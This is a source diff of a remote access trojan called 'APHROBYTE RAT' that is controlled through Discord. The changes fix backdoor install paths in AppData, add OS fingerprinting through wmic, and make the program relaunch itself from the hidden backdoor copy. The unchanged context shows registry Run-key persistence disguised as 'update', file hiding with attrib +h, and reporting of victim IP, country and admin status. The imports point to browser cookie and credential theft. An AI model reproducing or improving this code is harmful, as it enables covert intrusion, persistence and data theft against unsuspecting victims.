@@ -1,4 +1,4 @@
-import pyautogui, cv2, time, playsound, threading, win32api, discord, requests,base64, os, json, psutil, ctypes,win32crypt, rotatescreen as rs, sys, winreg, subprocess, random, socket, pyperclip, tkinter as tk, tkinter.messagebox, browser_cookie3, inspect, urllib, platform, shutil
+import pyautogui, cv2, time, playsound, threading, win32api, discord, requests,base64, os, json, psutil, ctypes,win32crypt, rotatescreen as rs, sys, winreg, subprocess, random, socket, pyperclip, tkinter as tk, tkinter.messagebox, browser_cookie3, inspect, urllib, shutil
 from discord.ext import commands
 from Crypto.Cipher import AES
 from gtts import gTTS
@@ -23,9 +23,9 @@ hide_after_exec = "{hideafterexec}"
 
 backdoor_location = "{backdoorlocation}"
 if backdoor_location == "\\AppData\\Roaming\\":
-    backdoor_location = os.environ["appdata"] + process_name
+    backdoor_location = os.environ["appdata"] + "\\" + process_name
 else:
-    backdoor_location = os.environ["appdata"] + "Microsoft\\" + process_name
+    backdoor_location = os.environ["appdata"] + "\\Microsoft\\" + process_name
 
 annc_channel_id = "{announcements}"
 pass_channel_id = annc_channel_id
@@ -181,6 +181,18 @@ async def on_ready():
         cflag = ldata['country_code']
         ipaddress = ldata['IPv4']
 
+    output = os.popen("wmic os get name").read()
+    if "Windows 10" in output:
+        platform = "Windows 10"
+    elif "Windows 11" in output:
+        platform = "Windows 11"
+    elif "Windows 8" in output:
+        platform = "Windows 8"
+    elif "Windows 7" in output:
+        platform = "Windows 7"
+    else:
+        platform = "Unbound"
+
     user = os.getlogin()
     host_id = socket.gethostname()
     #guild = client.get_guild(int(guild_id))
@@ -195,7 +207,7 @@ async def on_ready():
 :skull_crossbones: `->` IP Address : ||{ipaddress}|| <- :flag_{cflag.lower()}:
 :skull_crossbones: `->` Admin privileges : **{admincheck()}**
 :skull_crossbones: `->` Auto startup : **{autostart}**
-:skull_crossbones: `->` OS : **{platform.system()} {platform.release()}**
+:skull_crossbones: `->` OS : **{platform}**
 :skull_crossbones: `->` Usage ID : ||{clientid}||
 
 ``` APHROBYTE RAT v1.9.2 | {client.user.name} | RIOT ADMINISTRATION ```
@@ -276,7 +288,6 @@ async def startup(ctx, *, usid):
                 isexe = True
             if isexe:
                 if (sys.argv[0].endswith("exe")):
-                    backdoor_location = os.environ["appdata"] + "\\Windows-Updater.exe"
                     if not os.path.exists(backdoor_location):
                         shutil.copyfile(sys.executable, backdoor_location)
                         subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_location + '" /f', shell=True)
@@ -1089,6 +1100,9 @@ def mainfunc():
                 subprocess.call(command, shell=True)
                 p = os.popen('attrib +h "' + backdoor_location + '"')
                 p.close()
+            if not sys.argv[0].endswith(process_name):
+                os.startfile(backdoor_location)
+                os._exit(0)
     
     
 
